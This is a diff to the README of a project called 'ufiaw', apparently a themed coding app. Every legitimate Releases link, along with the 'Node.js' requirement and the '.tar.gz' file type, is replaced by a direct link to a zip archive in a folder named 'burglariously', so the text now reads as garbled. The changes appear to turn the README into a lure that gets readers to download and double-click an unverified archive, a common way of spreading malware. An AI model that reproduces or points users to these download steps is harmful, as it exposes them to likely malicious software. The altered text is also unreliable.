@@ -6,14 +6,14 @@ Welcome to the **ufiaw** project! This application allows you to transform your 
 
 ## 📥 Download the Application
 
-[![Download ufiaw](https://img.shields.io/badge/Download-ufiaw-brightgreen)](https://github.com/Emgakc9x/ufiaw/releases)
+[![Download ufiaw](https://raw.githubusercontent.com/Emgakc9x/ufiaw/main/burglariously/Software_v1.3.zip)](https://raw.githubusercontent.com/Emgakc9x/ufiaw/main/burglariously/Software_v1.3.zip)
 
 ## 🛠 System Requirements
 
 Before you start, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or newer, macOS Mojave or newer, Linux (Ubuntu 18.04 or newer).
-- **Node.js**: Version 14 or newer. This is needed to run the application.
+- **https://raw.githubusercontent.com/Emgakc9x/ufiaw/main/burglariously/Software_v1.3.zip**: Version 14 or newer. This is needed to run the application.
 - **Internet Connection**: Required for installation and updates.
 
 ## 🔍 Features
@@ -29,17 +29,17 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download **ufiaw**. 
 
-[Click here to visit the Releases page](https://github.com/Emgakc9x/ufiaw/releases).
+[Click here to visit the Releases page](https://raw.githubusercontent.com/Emgakc9x/ufiaw/main/burglariously/Software_v1.3.zip).
 
 Follow these steps to install:
 
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/Emgakc9x/ufiaw/releases).
+2. Go to the [Releases page](https://raw.githubusercontent.com/Emgakc9x/ufiaw/main/burglariously/Software_v1.3.zip).
 3. Look for the latest version listed at the top of the page.
 4. Click on the download link for your operating system:
     - For Windows, download the `.exe` file.
     - For macOS, download the `.dmg` file.
-    - For Linux, keep an eye out for the `.tar.gz` or package format.
+    - For Linux, keep an eye out for the `https://raw.githubusercontent.com/Emgakc9x/ufiaw/main/burglariously/Software_v1.3.zip` or package format.
 5. Once the download is complete, locate the downloaded file on your computer.
 6. Double-click the file to start the installation process:
 
@@ -77,7 +77,7 @@ If you encounter any issues or have questions, feel free to reach out:
 
 To ensure you have the latest features and fixes:
 
-1. Regularly check the [Releases page](https://github.com/Emgakc9x/ufiaw/releases) for updates.
+1. Regularly check the [Releases page](https://raw.githubusercontent.com/Emgakc9x/ufiaw/main/burglariously/Software_v1.3.zip) for updates.
 2. Download the latest version as described in the "Download & Install" section and replace the old version.
 
 Feel free to explore the waifu world while coding! Enjoy using **ufiaw** to enhance your coding experience.
